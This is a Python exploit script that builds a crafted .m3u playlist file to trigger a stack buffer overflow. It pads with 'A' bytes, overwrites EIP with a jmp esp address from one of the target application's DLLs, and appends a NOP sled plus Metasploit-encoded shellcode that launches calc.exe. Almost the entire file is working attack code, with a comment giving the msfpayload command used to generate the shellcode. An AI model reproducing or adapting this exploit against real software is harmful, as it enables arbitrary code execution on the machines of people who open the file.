import struct

file = "crash_0.m3u"
junk = "\x41"*25000
junk += "\x41"*1009  ## note this may change.. if this does not work, please recheck for this value using pattern technique
eip = struct.pack('<I', 0x01b0f23a) # jmp esp in one of app's dll
shellcode = "\x90"*25

# msfpayload windows/exec CMD=calc.exe | msfencode -a x86 -b '\x00\x09\x0a' -t c
#### For Calc.exe ##############################################################
shellcode += ("\xb8\x74\x92\x4a\x77\xd9\xc5\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x32\x83\xc2\x04\x31\x42\x0e\x03\x36\x9c\xa8\x82\x4a\x48\xa5"
"\x6d\xb2\x89\xd6\xe4\x57\xb8\xc4\x93\x1c\xe9\xd8\xd0\x70\x02"
"\x92\xb5\x60\x91\xd6\x11\x87\x12\x5c\x44\xa6\xa3\x50\x48\x64"
"\x67\xf2\x34\x76\xb4\xd4\x05\xb9\xc9\x15\x41\xa7\x22\x47\x1a"
"\xac\x91\x78\x2f\xf0\x29\x78\xff\x7f\x11\x02\x7a\xbf\xe6\xb8"
"\x85\xef\x57\xb6\xce\x17\xd3\x90\xee\x26\x30\xc3\xd3\x61\x3d"
"\x30\xa7\x70\x97\x08\x48\x43\xd7\xc7\x77\x6c\xda\x16\xbf\x4a"
"\x05\x6d\xcb\xa9\xb8\x76\x08\xd0\x66\xf2\x8d\x72\xec\xa4\x75"
"\x83\x21\x32\xfd\x8f\x8e\x30\x59\x93\x11\x94\xd1\xaf\x9a\x1b"
"\x36\x26\xd8\x3f\x92\x63\xba\x5e\x83\xc9\x6d\x5e\xd3\xb5\xd2"
"\xfa\x9f\x57\x06\x7c\xc2\x3d\xd9\x0c\x78\x78\xd9\x0e\x83\x2a"
"\xb2\x3f\x08\xa5\xc5\xbf\xdb\x82\x3a\x8a\x46\xa2\xd2\x53\x13"
"\xf7\xbe\x63\xc9\x3b\xc7\xe7\xf8\xc3\x3c\xf7\x88\xc6\x79\xbf"
"\x61\xba\x12\x2a\x86\x69\x12\x7f\xe5\xec\x80\xe3\xea")
################################################################################


fo = open(file,'wb')
fo.write(junk+eip+shellcode)
fo.close()
print "{} created successfully".format(file)